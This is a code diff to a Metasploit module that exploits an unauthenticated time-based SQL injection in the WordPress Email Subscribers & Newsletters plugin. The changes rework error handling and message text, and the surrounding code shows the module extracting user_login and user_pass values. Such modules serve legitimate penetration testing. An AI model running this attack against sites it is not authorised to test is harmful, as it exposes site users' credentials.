@@ -16,7 +16,7 @@ class MetasploitModule < Msf::Auxiliary
         'Name' => 'WordPress Email Subscribers and Newsletter Hash SQLi Scanner',
         'Description' => %q{
           Email Subscribers & Newsletters plugin contains an unauthenticated timebased SQL injection in
-          versions before 4.3.1.  The vulnerable parameter is in the `hash` parameter.
+          versions before 4.3.1.  The hash parameter is vulnerable to injection.
         },
         'Author' =>
           [
@@ -45,17 +45,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     unless wordpress_and_online?
-      vprint_error('Server not online or not detected as wordpress')
-      return
+      fail_with Failure::NotVulnerable, 'Server not online or not detected as wordpress'
     end
 
     checkcode = check_plugin_version_from_readme('email-subscribers', '4.3.1')
     if checkcode == Msf::Exploit::CheckCode::Safe
-      vprint_error('Loginizer version not vulnerable')
-      return
-    else
-      print_good('Vulnerable version detected')
+      fail_with Failure::NotVulnerable, 'Email subscribers and newsletter version not vulnerable'
     end
+    print_good('Vulnerable version detected')
 
     guid = Rex::Text.rand_guid
     email = "#{Rex::Text.rand_text_alpha(8)}@#{Rex::Text.rand_text_alpha(8)}.com"
@@ -75,8 +72,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with Failure::Unreachable, 'Connection failed' unless res
     end
     unless @sqli.test_vulnerable
-      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
-      return
+      fail_with Failure::PayloadFailed, "#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay."
     end
 
     columns = ['user_login', 'user_pass']
